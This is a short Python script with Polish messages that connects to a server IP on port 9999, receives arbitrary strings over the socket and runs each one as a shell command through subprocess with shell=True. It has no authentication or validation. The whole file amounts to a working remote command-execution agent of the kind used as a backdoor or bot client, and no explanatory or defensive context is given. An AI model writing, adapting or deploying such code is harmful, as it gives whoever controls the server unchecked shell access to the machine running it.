import socket
import threading
import subprocess
import sys

PORT = 9999

def receive_commands(sock):
    while True:
        try:
            data = sock.recv(1024)
            if not data:
                print("[INFO] Serwer zamknął połączenie.")
                break
            command = data.decode()
            print(f"[KOMENDA] Wykonuję: {command}")
            run_command(command)
        except Exception as e:
            print(f"[ERROR] {e}")
            break

def run_command(cmd):
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print("[WYNIK KOMENDY]")
        print(result.stdout)
        if result.stderr:
            print("[BŁĄD KOMENDY]")
            print(result.stderr)
    except Exception as e:
        print(f"[ERROR podczas wykonania komendy] {e}")

def main():
    if len(sys.argv) >= 2:
        server_ip = sys.argv[1]
    else:
        server_ip = input("IP: ").strip()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((server_ip, PORT))
        print(f"[INFO] Połączono z serwerem {server_ip}:{PORT}")
        receive_commands(client)
    except Exception as e:
        print(f"[ERROR] Nie udało się połączyć: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    main()
